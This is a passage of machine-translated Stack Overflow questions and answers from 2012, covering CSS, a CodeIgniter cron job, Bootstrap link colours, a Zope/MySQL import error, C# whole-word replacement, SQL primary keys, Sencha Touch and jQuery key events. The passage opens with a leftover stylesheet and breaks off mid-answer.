/*---:[ headlines ]:---*/

h1, h2, h3 { font-weight: bold; font-family: Helvetica, Arial, sans-serif; }

h1 { font-size: 36px; letter-spacing: -0.03em; }

* html h1 { letter-spacing: -0.1em; }

  #masthead h1 { padding: 0.4em 0; border-top: 1px solid #ccc; text-align: center; clear: 

both; min-height:40px; _height:40px; }
  #masthead h1 a { color: #333; background: none }

  h1 a { color: #3888B4; background-color: #ffffff; text-decoration: none; }
  h1 a:visited { color: #3888B4; background-color: #ffffff; text-decoration: none; }
  h1 a:hover { color: #8DC919; background-color: #ffffff; text-decoration: none; }

h2 { font-size: 20px; margin: 0px 0; color: #8DC919; background-color: #ffffff; }

  h2 a { text-decoration: none; color: #94C120; background-color: #ffffff; }

  h2 a:visited { text-decoration: none; color: #94C120; background-color: #ffffff; }

  h2 a:hover { text-decoration: none; color: #94C120; background-color: #ffffff; }

  .posts h2 { margin: 0 0 0.1em 0; line-height: 1.2em; }

  .pages h2, h2.page_header { margin: 0 0 0.75em 0; padding: 0 0 0.6em 0; background: url

('hr_title_sep.gif') 0 100% no-repeat; }

  h2.archive_head { font-weight: bold !important; font-size: 1.4em !important; text-transform: 

uppercase !important; letter-spacing: normal !important; margin: 0 0 1.8em 0 !important; 

padding: 0.4em 2px !important; border-top: 3px solid #000 !important; background: url

('hr_dot_black.gif') 0 100% repeat-x !important; }

h3 { font-size: 1.0em; text-transform: uppercase; }

  .entry h3 { margin: 2.5em 0 0.5em 0; }

  .entry h3.top { margin: 1.5em 0 0.5em 0 !important; }

  h3.comments_headers { font-size: 1.4em; }

h4 { font: 1.1em Georgia, "Times New Roman", Times, serif; color: #B0B0B0; background-color: 

#ffffff; }

  h4 a, h4 a:visited { color: #333; background-color: #ffffff; text-decoration: none; }

  h4 a:hover { color: #8DC919; background-color: #ffffff; text-decoration: underline; }

  .posts h4 { margin: 0 0 1.25em 0; padding: 0 0 1.0em 0; background: url('hr_title_sep.gif') 

0 100% no-repeat; }

  .pages h4 { font-size: 1.2em; line-height: 1.6em; margin: 0 0 4.0em 0; padding: 0.4em 0 0 0; 

background: url('hr_tag_sep.gif') no-repeat; clear: both; }

/*---:[ core layout elements ]:---*/

#container { width: 770px; margin: 0 auto; padding-top: 15px;}

  #content_box { width: 770px; text-align: left; float: left; clear: both; line-height:1.5;}

    #content { width: 500px; padding: 0 40px 0 0; float: left; }

    * html #content { overflow: hidden; }

    #sidebar { width: 230px; float: left; }

    * html #sidebar { overflow: hidden; }

  #footer { width: 770px; margin-top: 20px; padding: 1.0em 0; border-top: 2px solid #ccc; 

font: 12px  Helvetica, Arial, sans-serif;  float: left; clear: both; }

/*---:[ header styles ]:---*/

#masthead { width: 770px; line-height:1.5;}

   /* uncomment this line if you use a graphic in the header - make sure the height of your 

header graphic is equal to the height declared in this line of code! */

#header_img {
  background: #fff url(default_header.jpg) no-repeat 0 0;
  height: 0px;
  width: 0px;
}

#nav_h ul {
  margin-left: 0;
  padding-left: 0;
  display: inline;
  } 

#nav_h ul li {
  margin-left: 0;
  padding-right: 0;
  list-style: none;
  display: inline;
  }

#nav_h ul li.first {
  margin-left: 0;
  border-left: none;
  list-style: none;
  display: inline;
  }

ul#nav { list-style: none; width: 750px; padding: 0 10px; background: url('hr_dot_black.gif') 

repeat-x; border-bottom: 3px solid #000; float: left; clear: both; }

  ul#nav li { padding: 0.85em 42px 0.7em 0; font: bold 1.4em Helvetica, Arial, sans-serif; 

text-transform: none; float: left; }

    ul#nav li a, ul#nav li a:visited { color: #3D3D3D; background-color: #ffffff; text-

decoration: none; }

    ul#nav li a:hover { color: #94c120; background-color: #ffffff; text-decoration: none; }

    ul#nav li a.current, ul#nav li a.current:visited, ul#nav li a.current:hover { color: 

#94c120; background-color: #ffffff; text-decoration: none; }

  ul#nav li.rss { padding: 0.85em 0 0.7em 0; float: right; }

    ul#nav li.rss a { padding: 0 18px 0 0; background: url('icon_rss.gif') 100% 50% no-repeat; 

}

#header_img { margin: 0 0 3.0em 0; border-bottom: 1px solid #000; float: left; clear: both; }

  #header_img img { display: block; } /* this is really just an IE 6 and 7 hack in disguise */
/*---:[ content styles ]:---*/
#content_box { font-size: 14px; line-height:1.5;}

#content_box p { font-size: 14px; line-height:1.5;}

.navigation { width: 500px; margin: 0 0 3.0em 0; font-size: 1.4em; float: left; }

* html .navigation { margin: 0 0 2.5em 0; }

  .previous { padding: 0 20px 0 0; float: left; }

  .next { float: right; }

.clear { width: 500px; height: 1px; clear: both; }

/*---:[ footer styles ]:---*/

#footer a, #footer a:visited, #footer a:hover { color: #333; background-color:#FFFFFF; text-

decoration: none; border-bottom: dotted 1px #666666; }

.wsite-footer p {
    color: rgb(51, 51, 51);
    font-size: 12px;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:40:29.793

您发布了您网站的 CSS（样式），如果我对 Weebly 的理解正确，您将不得不为自定义 HTML 添加一个元素，并从 Twitter/Facebook/G+ 获取 HTML 代码。他们有非常简单的指导步骤，但实际上您将他们的代码粘贴到您的自定义 HTML 元素中。

*   [推特按钮](https://twitter.com/about/resources/buttons)
*   [Facebook 喜欢按钮](https://developers.facebook.com/docs/reference/plugins/like/)
*   [谷歌加 +1 按钮](https://developers.google.com/+/plugins/+1button/)

# php - Cron 作业 - Codeigniter - 找不到类“CI_Controller”

> ID：13870716
> 
> 赞同：2
> 
> 时间：2012-12-14T00:02:27.573
> 
> 标签：php, codeigniter, cron

我正在尝试使用以下命令在 cpanel 上创建一个 cron 作业：

```
/usr/bin/php -q /home/mystuff/public_html/application/controllers/scripts.php scripts release_reviews 
```

我的 scripts.php 控制器如下：

```
<?php

class Scripts extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();

        if (!$this->input->is_cli_request()) show_error('Direct access is not allowed');

    }

    public function release_reviews()
    {
        echo release_reviews(); //where the actual logic will sit once the cron job works
    }
} 
```

当我尝试运行 cron 作业时得到的反馈： **致命错误：第****3**行的**/home/mystuff/public_html/application/controllers/scripts.php**中未找到 Class 'CI_Controller'

 **我找不到任何证据表明有人和我有同样的问题 - 围绕这个问题的大多数主题都和我一样，而且它显然工作得很好。

提前非常感谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T00:08:05.353

要通过命令行访问 CodeIgnter，您需要调用该`index.php`文件，而不是您的控制器。

```
php /home/mystuff/public_html/index.php scripts release_reviews 
```

文档：[http ://ellislab.com/codeigniter/user-guide/general/cli.html](http://ellislab.com/codeigniter/user-guide/general/cli.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:07:34.093

没有`CI_Controller`课。`CRON`作业仅加载该文件，因此找不到任何`CI_Controller`. 您将不得不`CI_CONTROLLER`在类定义之前包含该类

像这样的东西

```
<?php

require_once('path_to_CI_controller');

class Scripts extends CI_Controller
{
    ... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-20T13:58:01.020

在路由文件中使用了以下内容，它起作用了！我想通了。我的新手问题是需要配置参数。

例如

```
`$route['pdfscript/runmethod']  = "batch/pdfscript/runmethod";
$route['pdfscript/runmethod/(:any)'] = "batch/pdfscript/runmethod/$1";'

`pdfscript.php
<?php 
class pdfscript extends CI_Controller {
public function runmethod($file) {
echo $file;
.....` 
```

**cmd line>** php.exe index.php pdfscript runmethod 文件名**

# css - 为什么使用引导程序时它不显示蓝色的超链接？

> ID：13870719
> 
> 赞同：0
> 
> 时间：2012-12-14T00:02:39.267
> 
> 标签：css, twitter-bootstrap, stylesheet

我正在使用带有 twitter-bootstrap 的 Ruby on rails3 创建网站。
我从官方网站下载了 bootstrap.css 并进行了设置。

它显示了所有整洁但超链接的颜色。
我想要它是蓝色的，但所有的超链接都显示为黑色......
谁能告诉我为什么？我不知道为什么

我的代码是

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test</title>
    <meta content="authenticity_token" name="csrf-param" />
<meta content="Ojw/+I3qfeT25/i6L8ipof4U44ytbGXwcwrzHyIOICM=" name="csrf-token" />
    <script src="/assets/jquery.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery_ujs.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-transition.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-alert.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-modal.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-dropdown.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-scrollspy.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-tab.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-tooltip.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-popover.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-button.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-collapse.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-carousel.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap/bootstrap-typeahead.js?body=1" type="text/javascript"></script>
<script src="/assets/twitter/bootstrap.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap.js?body=1" type="text/javascript"></script>
<script src="/assets/communities.js?body=1" type="text/javascript"></script>
<script src="/assets/follows.js?body=1" type="text/javascript"></script>
<script src="/assets/messages.js?body=1" type="text/javascript"></script>
<script src="/assets/rails.js?body=1" type="text/javascript"></script>
<script src="/assets/registrations.js?body=1" type="text/javascript"></script>
<script src="/assets/top.js?body=1" type="text/javascript"></script>
<script src="/assets/user_profiles.js?body=1" type="text/javascript"></script>
<script src="/assets/users.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery.ui.core.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery.ui.datepicker.js?body=1" type="text/javascript"></script>
<script src="/assets/application.js?body=1" type="text/javascript"></script>
<link href="/assets/application.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/boostrap.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/communities.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/follows.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/messages.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/registrations.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/scaffolds.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/top.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/users.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/jquery.ui.core.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/jquery.ui.theme.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/jquery.ui.datepicker.css?body=1" media="all" rel="stylesheet" type="text/css" />

    <link href="images/favicon.ico" rel="shortcut icon">
    <link href="images/apple-touch-icon.png" rel="apple-touch-icon">
    <link href="images/apple-touch-icon-72x72.png" rel="apple-touch-icon" sizes="72x72">
    <link href="images/apple-touch-icon-114x114.png" rel="apple-touch-icon" sizes="114x114">

  </head>
  <body>

      <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container">
          <a class="btn btn-navbar" data-target=".nav-collapse" data-toggle="collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
          <a href="/" class="brand">Test</a>

          <div class="pull-right">
                    <div class="btn-group">
                    <a class="btn dropdown-toggle" data-toggle="dropdown" href="#">
                    <i class="icon-user"></i> 
                    John   <span class="caret"></span>
                    </a>
                    <ul class="dropdown-menu">
                    <li><a href="/users/edit"><i class="icon-cog"></i> Edit</a></li>
                    <li class="divider"></li>
                    <li>
                    <a href="/logout"><i class="icon-chevron-up"></i> Log out</a>       
                    </li>
                    </ul>
                    </div>

          </div>

          <div class="container nav-collapse">
            <ul class="nav">

            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container wrapper">

      <div class="content">
        <div class="row">
            <div class="span12">

            </div>
        </div>

        <div class="row">         

          <div class="span9">

  <ul class="breadcrumb" id=""><li><a href="/">TOP</a><span class="divider">/</span></li><li><a href="/messages/received">Messages</a><span class="divider">/</span></li></ul>

            <div class="well sidebar-nav">
                <div class="page-header">
  <h1>
    Received Messages

  </h1>
</div>
<table class="table table-striped table-hover table-condensed">
  <thead>
    <tr>
      <th>delete</th>
      <th>ID</th>
      <th>Unread</th>
      <th>Date</th>
      <th>
      From
      </th>
      <th>Subject</th>
    </tr>
  </thead>
  <tbody>

      <form accept-charset="UTF-8" action="/messages/discard?via=post" method="post"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /><input name="authenticity_token" type="hidden" value="Ojw/+I3qfeT25/i6L8ipof4U44ytbGXwcwrzHyIOICM=" /></div>   
          <tr>
           <td><input id="id_" name="id[]" type="checkbox" value="6" /></td>
           <td>6</td>
           <td></td>
           <td>December 13, 2012</td>
           <td>
           Mike</td>

           <td><a href="/messages/show/6?breadcrumb=inbox">Re: Re: ssss</a></td>
          </tr>
          <tr>
           <td><input id="id_" name="id[]" type="checkbox" value="5" /></td>
           <td>5</td>
           <td></td>
           <td>December 13, 2012</td>
           <td>
           Mike</td>

           <td><a href="/messages/show/5?breadcrumb=inbox">Re: Re: ssss</a></td>
          </tr>
          <tr>
           <td><input id="id_" name="id[]" type="checkbox" value="1" /></td>
           <td>1</td>
           <td></td>
           <td>December 13, 2012</td>
           <td>
           Mike</td>

           <td><a href="/messages/show/1?breadcrumb=inbox">ssss</a></td>
          </tr>

    <input class="btn btn-mini btn-danger" name="commit" type="submit" value="delete checked items" />

</form>  </tbody>
</table>

</ br>
<div class='text-align:center;'>

</div>
            </div>

          </div>

          <div class="span3">

              <div class="well sidebar-nav">
                <h3>Menu</h3>
                <ul class="nav nav-list">
                  <li class="nav-header">Account</li>

                      <li>
                      <a href="/users/edit"><i class="icon-cog"></i> User Edit</a>
                      </li>
                <li class="divider"></li>
                  <li class="nav-header">Messages</li>
                  <li><a href="/messages/received"><i class="icon-envelope"></i> Received</a></li>

                  <li><a href="/messages/sent"><i class="icon-share-alt"></i> Sent</a></li>
                  <li><a href="/messages/trash"><i class="icon-trash"></i> Trash</a></li>
             <li class="divider"></li>
                  <li class="nav-header">Lists</li>
                  <li><a href="/users"><i class="icon-envelope"></i> User List</a></li>
                  <li><a href="/communities"><i class="icon-share-alt"></i> Community List</a></li>
                </ul>
                <br />  

              </div><!--/.well -->

          </div>

        </div><!--/row-->

      </div><!--/content-->

    </div> <!-- /container -->

      <footer>
      <br />
      <br />
        <p><center>&copy; 2012 Test</center></p>
      </footer> 

  </body>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:14:43.983

默认情况下，引导链接是蓝色的。在那一大堆 CSS 文件中的某个地方有一个规则集，看起来至少有点像这样：

```
a { color:black; } 
```

如果您将 Firefox 与 Firebug 或 Chrome 开发工具一起使用，您可以检查任何锚元素并查看违规规则集的确切位置。

或者，您可以将此规则集放在要加载的最后一个 CSS 文件的底部：

```
a { color:blue; } 
```

# python - MySQL 的旧版 Zope 动态加载错误

> ID：13870720
> 
> 赞同：0
> 
> 时间：2012-12-14T00:02:50.170
> 
> 标签：python, mysql-python, zope, importerror, python-2.4

我正在将 Zope 2 的旧安装移动到新的 Mac OS 10.8 服务器。不幸的是，我们的服务器需要 Python 2.4 才能运行，所以我安装了 MacPorts 版本。服务器加载正常，直到它尝试加载 MySQL-python 模块，此时它以`ImportError`：

```
Traceback (most recent call last):
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/Zope2/Startup/run.py", line 56, in ?
    run()
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/Zope2/Startup/run.py", line 21, in run
    starter.prepare()
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/Zope2/Startup/__init__.py", line 98, in prepare
    self.startZope()
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/Zope2/Startup/__init__.py", line 257, in startZope
    Zope2.startup()
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/Zope2/__init__.py", line 47, in startup
    _startup()
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/Zope2/App/startup.py", line 45, in startup
    OFS.Application.import_products()
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/OFS/Application.py", line 675, in import_products
    import_product(product_dir, product_name, raise_exc=debug_mode)
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/OFS/Application.py", line 698, in import_product
    product=__import__(pname, global_dict, global_dict, silly)
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/Products/ZMySQLDA/__init__.py", line 91, in ?
    import DA
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/Products/ZMySQLDA/DA.py", line 92, in ?
    from db import DB
  File "/home/zope/envLRC/Zope.2.8.6/lib/python/Products/ZMySQLDA/db.py", line 89, in ?
    import _mysql
  File "build/bdist.macosx-10.8-x86_64/egg/_mysql.py", line 7, in ?
  File "build/bdist.macosx-10.8-x86_64/egg/_mysql.py", line 6, in __bootstrap__
ImportError: Inappropriate file type for dynamic loading 
```

服务器在 virtualenv 中运行，以确保使用 Python 2.4。谁能向我解释为什么会产生这个错误以及应该怎么做？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T06:32:25.433

看起来像是安装/创建的东西`_mysql.py`，你应该有一个`_mysql.so`. 如果您有`.so`，请尝试重命名`_mysql.py`文件并重新启动。

# c# - 如何仅搜索和替换完全匹配的字符串

> ID：13870725
> 
> 赞同：14
> 
> 时间：2012-12-14T00:03:02.037
> 
> 标签：c#

我需要在一个字符串中搜索并替换某个字符串

> 例如：搜索字符串“将附加字符串添加到文本框”。将“添加”替换为“插入”
> 
> 输出预期=“将附加字符串插入文本框”

如果你使用 string s="Add Additional String to text box".replace("Add","Insert");

> 输出结果=“将插入字符串插入文本框”

有没有人有想法让这个工作得到预期的输出？

谢谢！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-14T00:29:36.447

您可以使用正则表达式来执行此操作：

扩展方法示例：

```
public static class StringExtensions
{
    public static string SafeReplace(this string input, string find, string replace, bool matchWholeWord)
    {
        string textToFind = matchWholeWord ? string.Format(@"\b{0}\b", find) : find;
        return Regex.Replace(input, textToFind, replace);
    }
} 
```

用法：

```
 string text = "Add Additional String to text box";
  string result = text.SafeReplace("Add", "Insert", true); 
```

结果：“将附加字符串插入文本框”

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-14T00:22:24.053

```
string pattern = @"\bAdd\b";
string input = "Add Additional String to text box";
string result = Regex.Replace(input, pattern, "Insert", RegexOptions.None); 
```

"\bAdd\b" 确保它将匹配不属于其他单词的 "Add"。希望它有帮助。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2019-02-22T15:28:09.290

回答：
“如果我需要替换以 @ 开头的单词，则此解决方案不起作用。在这里提琴 dotnetfiddle.net/9kgW4h 如何在这种情况下使其正常工作。– Frenz 2017 年 1 月 16 日 5:46”

可能的解决方案：

```
public static string SafeReplace(this string input, string find, string replace, bool matchWholeWord) {
    string searchString = find.StartsWith("@") ? $@"@\b{find.Substring(1)}\b" : $@"\b{find}\b"; 
    string textToFind = matchWholeWord ? searchString : find;
    return Regex.Replace(input, textToFind, replace);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-20T10:00:07.717

```
//Find and Replace A word in c#
public static class Program
    {
        public static string Replace(this String str, char[] chars, string replacement)
        {
            StringBuilder output = new StringBuilder(str.Length);
            bool replace = false;
            if (chars.Length - 1 < 1)
            {
                for (int i = 0; i < str.Length; i++)
                {

                    char c = str[i];
                    replace = false;
                    //  int val = Regex.Matches(ch.ToString(), @"[a-zA-Z]").Count;

                    for (int j = 0; j < chars.Length; j++)
                    {
                        if (chars[j] == c)
                        {
                            replace = true;

                            break;

                        }

                    }

                    if (replace)
                        output.Append(replacement);
                    else
                        output.Append(c);
                }
            }
            else
            {

                int j = 0;
                int truecount = 0;
                    char c1 = '\0';
                    for (int k = 0; k < str.Length; k++)
                    {
                       c1 = str[k];

                        if (chars[j] == c1)
                        {
                            replace = true;
                            truecount ++;

                        }

                        else
                        {
                            truecount = 0;
                            replace = false;
                            j = 0;
                        }
                        if(truecount>0)
                        {
                            j++;
                        }

                        if (j > chars.Length-1)
                        {
                            j = 0;
                        }

                        if (truecount == chars.Length)
                        {
                            output.Remove(output.Length - chars.Length+1, chars.Length-1);
                           // output.Remove(4, 2);
                            if (replace)
                                output.Append(replacement);
                            else
                                output.Append(c1);
                        }
                        else
                        {
                            output.Append(c1);
                        }

                    }

            }

            return output.ToString();
        }

    static void Main(string[] args)
    {

        Console.WriteLine("Enter a word");
        string word = (Console.ReadLine());

        Console.WriteLine("Enter a word to find");
        string find = (Console.ReadLine());

        Console.WriteLine("Enter a word to Replace");
        string Rep = (Console.ReadLine());

        Console.WriteLine(Replace(word, find.ToCharArray(), Rep));
        Console.ReadLine();

    }

} 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-12-14T00:09:14.133

使用`string.Replace(string old, string replacement)`方法。

```
 string input = "Add Additional String to text box";
 string output = input.replace("Add ", "Insert ");

 output == "Insert Additional String to text box" // true 
```

如果您需要更大的灵活性，请使用 RegEx，但由于您想替换一个精确的字符串，string.replace 方法就足够了。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-12-14T00:21:34.900

如果您只想替换一个完整的单词，而不是另一个单词中的对应关系，您可以执行以下操作：

```
// add a leading and tail space
string tmp = " " + "Add Additional String to text box"+ " ";
// replace the word you want, while adding a lead and tail space, and then Trim
tmp = tmp.Replace(" Add ", " Insert ").Trim(); 
```

现在无法测试，但这可能有效。

# sql - 如何在表中添加一列，然后将其变成主键列并在SQL上添加值？

> ID：13870729
> 
> 赞同：0
> 
> 时间：2012-12-14T00:03:37.660
> 
> 标签：sql, for-loop, primary-key, create-table, alter

我现在有这张桌子...

```
CREATE TABLE [dbo].[DatosLegales](
    [IdCliente] [int] NOT NULL,
    [Nombre] [varchar](max) NULL,
    [RFC] [varchar](13) NULL,
    [CURP] [varchar](20) NULL,
    [IMSS] [varchar](20) NULL,
    [Calle] [varchar](100) NULL,
    [Numero] [varchar](10) NULL,
    [Colonia] [varchar](100) NULL,
    [Pais] [varchar](50) NULL,
    [Estado] [varchar](50) NULL,
    [Ciudad] [varchar](50) NULL,
    [CodigoPostal] [varchar](10) NULL,
    [Telefono] [varchar](13) NULL,
    [TipoEmpresa] [varchar](20) NULL,
    [Tipo] [varchar](20) NULL,
) 
```

IdCliente 既是主键（不可索引），又与另一个表相关。我现在想要的是添加一个名为 IdDatoLegal 的列......我希望它成为新的主键，成为可索引的，对于已经添加的记录，我需要使用以下值更新它们：1、2、 3, 4....直到最后一行...

我正在开始查询，但我不知道如何继续...

```
ALTER TABLE DatosLegales DROP PRIMARY KEY;
ALTER TABLE DatosLegales ADD IdDatoLegal int;
//I guess here goes where update every row's IdDatoLegal
//Then when I specify that IdDatoLegal is indexable for future inserts
//and finally when I specify that IdDatoLegal is the new primary key 
```

我希望你能帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:24:38.180

Try this:

```
declare @sql nvarchar(max)

select @sql = 'alter table DatosLegales drop constraint ' + quotename(name)
from sys.indexes 
where object_id = object_id('DatosLegales')
and index_id = 1

exec(@sql)

alter table  DatosLegales
add IdDatoLegal bigint not null identity(1,1) 
constraint pk_DatosLegales primary key clustered

select * from DatosLegales 
```

# sencha-touch - 将 Sencha Touch 模型绑定到字段集

> ID：13870732
> 
> 赞同：1
> 
> 时间：2012-12-14T00:03:53.603
> 
> 标签：sencha-touch, sencha-touch-2

有没有办法将模型绑定到字段集，这样可以避免这样的代码（手动设置模型的每个字段）。

```
var vals = this.getUserDetail().getValues(),
            rec = this.getUserDetail().getRecord(),
            errorObject; // Ext.data.Errors
        rec.set('first', vals.first);
        rec.set('last', vals.last);
        rec.set('email', vals.email);
        errorObject = rec.validate(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T06:50:42.653

您需要将记录绑定到表单，而不是字段集。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T04:32:59.873

是的，就像表单有`.getValues()`方法一样。

您可以使用`setValues({obj...})`来更新表单值。如果您使用的是“模型/记录”，则可能必须使用`form.setValues(Model.data)`.

[关联](http://docs.sencha.com/touch/2-0/#!/api/Ext.form.Panel-method-setValues)

# javascript - jQuery 文档处理程序窃取输入字段中的按键

> ID：13870738
> 
> 赞同：1
> 
> 时间：2012-12-14T00:04:29.913
> 
> 标签：javascript, jquery

这个问题之前可能已经被问过，但我无法找到合适的搜索短语来定位它，无论是在这里还是在 intertubes 上。

我有一个使用键盘的游戏网页，所以使用 jQuery 我在文档中设置了处理程序：

```
$(document).keydown(myKeydown);
$(document).keyup(myKeyup);
$(document).blur(myBlur); 
```

但是现在输入字段中写入的任何文本都会被文档事件处理程序窃取，并且只有在文档处理程序中未使用字符时才会到达输入。这些处理程序本质上如下所示：

```
function myKeydown(event)
{
    if (event.which == 65)
    {
        console.log('a pressed');
        return false;
    }
    return true;
} 
```

现在假设我有一个文本输入框；如果我按下除“a”以外的任何键，它会显示在输入中，而不是“a”（因为 myKeydown 通过返回 false 来“吃掉”它）。在任何情况下我都可以返回 true，但是如果没有输入框被聚焦，我会得到奇怪的东西，比如“键入时搜索”，如果启用的话。

我试图为输入框添加处理程序：

```
input.keydown(function() { console.log('down'); return false; });
input.keyup(function() { console.log('up'); return false; });
input.blur(function() { console.log('blur'); return false; }); 
```

使用此代码，我得到了 console.logs，但当然键不会到达盒子（因为我没有对印刷机做任何事情）。我可以将这些事件发送到某个地方，以便相应的键出现在输入框中吗？

**注意：**有些人建议使用`event.stopPropagation()`而不是`return false`. [jQuery 文档](http://api.jquery.com/bind/)说：

> 从处理程序返回 false 等效于在事件对象上调用 .preventDefault() 和 .stopPropagation()。”

这正是我想要的：为了防止“输入时搜索”启动，我必须阻止默认操作，即在输入上输入并在页面上“输入时搜索”。

（此外，由于某种原因，`keydown`事件处理程序在 Firefox 最新版本上没有 stopPropagation() 函数。）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T01:06:33.493

要评论adeno clean：

```
function myKeydown(event)
{
    if (event.which == 65)
    {
        console.log('a pressed');
        event.stopPropagation();
    }
}
$(document).keydown(myKeydown); 
```

[样本](http://jsfiddle.net/oceog/VfTHB/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T00:16:41.613

有两种方法可以防止这种情况。

1.  在事件处理程序中获取目标，如果目标是`input`/ ，则忽略您的代码`textarea`

2.  将相同的事件绑定到输入并停止传播

第一个选择是正确的做法，IMO。尝试：

```
if ($(event.target).is('input, textarea, select'))
{
    return true;
} 
```

在事件处理程序的开头。

# ruby-on-rails-3 - Rails：控制器中的一种无需离开即可计算点击次数的方法

> ID：13870740
> 
> 赞同：1
> 
> 时间：2012-12-14T00:04:54.473
> 
> 标签：ruby-on-rails-3, model-view-controller

我正在尝试为我的控制器中的“阅读更多”链接创建一个方法，它只会计算点击次数，即除此之外什么都不做。我正在使用[印象派](https://github.com/charlotte-ruby/impressionist)gem 来计算印象，这一切都很好，但我想计算我的“阅读更多”链接上的点击次数，并且由于“阅读更多”链接只是 jQuery，因此没有其他控制器方法为他们。

这就是我到目前为止所得到的，我只需要发送点击结果而不离开或重新加载页面。

```
def read_more(a)
  @article = Article(a)
  impressionist(a)
end 
```

单击链接时出现此错误：

```
ActiveRecord::RecordNotFound (Couldn't find Doc with id=19) 
```

何时应该`Article`使用 ID 19 查找。

任何想法都会有很大的帮助。干杯!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:32:47.117

您可以通过以下方式呈现一些任意文本：

```
render(:text => @document.number_of_impressions) and return 
```

但我可能只是将其包装在一些 JSON 中并返回：

```
data = {:impressions => 74}
render(:json => data) and return 
```

通过使用 JSON，您可以选择稍后返回更多数据，如果您也需要的话。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:46:45.660

添加

```
@document.increment!(:number_of_impressions) 
```

到您的控制器。

如果您不想在增加值时保存文档，只需删除`increment`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-14T00:49:05.487

尝试

```
render :nothing => true 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T01:56:16.690

我想出了答案，如果其他人遇到类似的问题。

```
def read_more
  @article = Article.find(params[:id])
  impressionist(@article)
  render :json => "Read."
end 
```

显然你不能在控制器方法中有参数。

# javascript - 听一下按键的瞬间（就在按键从上到下变化的时候）？

> ID：13870742
> 
> 赞同：2
> 
> 时间：2012-12-14T00:05:08.733
> 
> 标签：javascript

我尝试使用 keydown 和 keypress 但如果用户按住键，两者都会不断触发。有没有办法只听用户按下键（从未按下变为按下），以便例如：按住键触发代码一次并按下它，释放它并再次按下它2次？

这就是我用来检查哪些键关闭的方法：

```
$(document).keydown(function (e){
    console.log(e.which);
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:09:01.963

您可以在第一次调用 时`keydown`取消绑定`keydown`处理程序，然后将其重新绑定到`keyup`.

```
// keydown is bound at load
$(document).keydown(function (e){
    // Call function
    doStuff();
});

// keyup rebinds the keydown event.
$(document).keyup(function(e) {
